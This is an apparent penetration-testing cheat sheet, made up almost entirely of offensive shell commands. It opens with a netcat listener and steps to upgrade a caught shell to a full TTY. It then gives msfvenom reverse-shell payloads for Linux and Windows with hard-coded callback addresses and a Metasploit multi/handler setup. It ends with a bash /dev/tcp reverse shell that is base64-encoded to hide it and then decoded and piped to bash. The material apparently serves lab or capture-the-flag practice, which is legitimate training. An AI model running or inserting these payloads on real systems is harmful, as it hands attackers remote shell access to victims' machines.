# Upgrade Shell

## Listener

```bash
rlwrap -cAr nc -nlvp 4444
```

## Upgrade Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Then `CTRL + Z`

```bash
stty raw -echo; fg
```

```bash
export SHELL=bash
export TERM=xterm
stty rows $(tput lines) columns $(tput cols)
```

# msfvenom

## Stageless

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=4444 -f elf > createbackup.elf
```
## Staged

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o payload.exe
```
### multi/handler:

```bash
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell/reverse_tcp

set LHOST <IP>

set LPORT <PORT>

set ExitOnSession false

exploit -j
```

# Base64 encoded reverse shell payload

```sh
echo -n 'bash -i >& /dev/tcp/10.10.14.57/6666 0>&1' | base64
```

```sh
echo '<base64_encoded_payload>' | base64 -d | bash
```